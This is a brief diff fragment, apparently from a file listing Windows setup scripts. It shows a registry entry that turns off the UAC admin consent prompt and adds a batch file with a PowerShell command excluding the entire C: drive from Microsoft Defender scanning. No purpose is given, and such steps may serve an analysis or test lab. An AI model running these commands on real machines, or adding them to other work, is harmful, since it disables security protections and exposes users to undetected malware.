@@ -77,3 +77,7 @@ DisableUAC.reg
 
         [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System]
         "ConsentPromptBehaviorAdmin"=dword:00000000
+
+ExclusionPath.bat
+
+    powershell.exe -command "Add-MpPreference -ExclusionPath C:\"
